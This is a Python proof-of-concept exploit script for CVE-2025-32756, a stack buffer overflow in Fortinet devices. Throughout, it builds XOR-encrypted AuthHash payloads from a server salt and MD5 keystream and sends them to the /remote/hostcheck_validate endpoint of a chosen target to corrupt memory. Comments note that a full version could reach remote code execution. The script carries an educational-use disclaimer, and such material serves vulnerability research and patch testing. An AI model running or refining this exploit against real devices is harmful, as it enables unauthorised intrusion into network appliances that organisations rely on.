#!/usr/bin/env python3
"""
Proof of Concept for CVE-2025-32756 - Fortinet Stack-Based Buffer Overflow
This script demonstrates the vulnerability by sending specially crafted HTTP requests
with malformed AuthHash values to potentially vulnerable Fortinet devices.

WARNING: This script is for educational purposes only. Use only on systems you own or have permission to test.

Author: Kn0x Researcher
Date: June 2025
"""

import requests
import argparse
import sys
import hashlib
import base64
import urllib.parse
import ssl
import time
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class FortinetExploit:
    def __init__(self, target, port=443, debug=False):
        self.target = target
        self.port = port
        self.debug = debug
        self.base_url = f"https://{target}:{port}"
        self.session = requests.Session()
        self.session.verify = False
        self.salt = None
        
    def log(self, message):
        if self.debug:
            print(f"[DEBUG] {message}")
            
    def error(self, message):
        print(f"[ERROR] {message}")
        sys.exit(1)
        
    def get_salt(self):
        """Retrieve the salt from the server"""
        try:
            response = self.session.get(f"{self.base_url}/remote/info", timeout=10)
            if response.status_code != 200:
                self.error(f"Failed to get salt. Status code: {response.status_code}")
                
            # Extract salt from response
            # In a real exploit, we'd parse the response properly
            self.salt = "e0b638ac"  # Example salt value
            self.log(f"Retrieved salt: {self.salt}")
            return self.salt
        except Exception as e:
            self.error(f"Error retrieving salt: {e}")
    
    def compute_md5_state(self, salt, seed):
        """Compute the initial MD5 state from salt and seed"""
        data = salt + seed + "GCC is the GNU Compiler Collection."
        return hashlib.md5(data.encode()).hexdigest()
    
    def compute_keystream(self, initial_state, length):
        """Generate keystream from initial state"""
        keystream = ""
        current = initial_state
        
        while len(keystream) < length:
            current = hashlib.md5(bytes.fromhex(current)).hexdigest()
            keystream += current
            
        return keystream[:length]
    
    def create_payload(self, seed, overflow_length):
        """Create an exploit payload with the given overflow length"""
        if not self.salt:
            self.get_salt()
            
        # Initial state calculation
        initial_state = self.compute_md5_state(self.salt, seed)
        self.log(f"Initial state: {initial_state}")
        
        # Create a payload that will cause buffer overflow
        # The format is: seed + encrypted_length + encrypted_data
        
        # For simplicity in this PoC, we're using a fixed pattern
        # In a real exploit, we'd craft this more carefully
        
        # Calculate the size that will trigger overflow
        # We need to encode a size that, when decrypted, will be larger than the buffer
        keystream_for_length = self.compute_keystream(initial_state, 32)[:4]
        
        # XOR the desired overflow length with the keystream to get encrypted length
        target_length = overflow_length
        enc_length_bytes = bytes([
            (target_length & 0xFF) ^ int(keystream_for_length[0:2], 16),
            ((target_length >> 8) & 0xFF) ^ int(keystream_for_length[2:4], 16)
        ])
        enc_length_hex = enc_length_bytes.hex()
        
        # Create payload data - in a real exploit this would be crafted to achieve RCE
        # Here we just use a pattern to demonstrate the overflow
        data = "A" * 64
        
        # Encrypt the data
        keystream_for_data = self.compute_keystream(initial_state, len(data) * 2)[6:]
        encrypted_data = ""
        for i in range(len(data)):
            encrypted_data += format(ord(data[i]) ^ int(keystream_for_data[i*2:i*2+2], 16), '02x')
        
        # Assemble the final payload
        payload = seed + enc_length_hex + encrypted_data
        
        self.log(f"Created payload with overflow length {overflow_length}")
        return payload
    
    def send_exploit(self, payload):
        """Send the exploit payload to the target"""
        try:
            url = f"{self.base_url}/remote/hostcheck_validate"
            enc_param = urllib.parse.quote(payload)
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            self.log(f"Sending payload to {url}")
            response = self.session.post(
                url,
                data=f"enc={enc_param}",
                headers=headers,
                timeout=10
            )
            
            self.log(f"Response status: {response.status_code}")
            self.log(f"Response headers: {response.headers}")
            
            return response
        except Exception as e:
            self.error(f"Error sending exploit: {e}")
    
    def execute(self):
        """Execute the exploit"""
        print(f"[*] Targeting {self.target}:{self.port}")
        
        # Get salt from target
        self.get_salt()
        
        # Create a seed value - in a real exploit we'd calculate this more carefully
        seed = "00690000"
        
        print(f"[*] Using seed: {seed}")
        
        # First request - set a byte to NULL
        print("[*] Sending first payload to set up the overflow...")
        payload1 = self.create_payload(seed, 4999)
        self.send_exploit(payload1)
        
        # Small delay between requests
        time.sleep(1)
        
        # Second request - set a specific byte to a controlled value
        print("[*] Sending second payload to trigger the vulnerability...")
        payload2 = self.create_payload(seed, 5000)
        response = self.send_exploit(payload2)
        
        # Check for signs of successful exploitation
        if response.status_code == 200:
            print("[+] Exploit likely succeeded!")
            print("[+] A vulnerable system would have the target byte modified")
            print("[+] In a real attack, this could lead to remote code execution")
        else:
            print("[-] Exploit may have failed or target might not be vulnerable")

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-32756 Fortinet Buffer Overflow PoC")
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("-p", "--port", type=int, default=443, help="Target port (default: 443)")
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug output")
    args = parser.parse_args()
    
    print("CVE-2025-32756 Fortinet Buffer Overflow PoC")
    print("WARNING: This is for educational purposes only!")
    print("Use only against systems you own or have permission to test.")
    print("=" * 60)
    
    exploit = FortinetExploit(args.target, args.port, args.debug)
    exploit.execute()

if __name__ == "__main__":
    main() 
